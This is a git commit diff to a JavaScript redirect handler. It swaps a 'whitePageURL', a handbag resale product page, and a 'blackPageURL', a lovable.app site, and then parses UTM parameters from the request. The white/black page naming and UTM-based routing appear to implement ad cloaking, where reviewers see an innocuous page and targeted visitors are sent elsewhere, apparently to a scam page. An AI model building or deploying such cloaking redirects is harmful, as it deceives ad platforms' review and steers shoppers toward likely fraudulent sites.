b736c9f2fadb141e1665f0a627a1d3ba84924a2f
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-13 00:35:48 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://swapup.com.au/collections/handbags/products/oroton-luxe-brown-trim-canvas-tote-bag-61b7";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://www.thepurseaffair.com/products/29389-louis-vuitton-taiga-long-wallet";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
